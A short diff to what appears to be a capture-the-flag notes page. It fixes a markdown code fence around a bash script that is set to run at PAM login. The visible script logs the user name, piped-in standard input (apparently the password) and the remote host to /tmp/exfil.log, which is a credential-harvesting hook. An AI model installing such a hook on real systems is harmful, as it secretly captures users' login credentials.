@@ -9,7 +9,7 @@ description: "CTF stuff"
 
 ## Script that will execute when user logs in via PAM
 
-``bash
+```bash
 #!/bin/bash
 
 echo "$(date) $PAM_USER, $(cat -), Host: $PAM_RHOST" >> /tmp/exfil.log
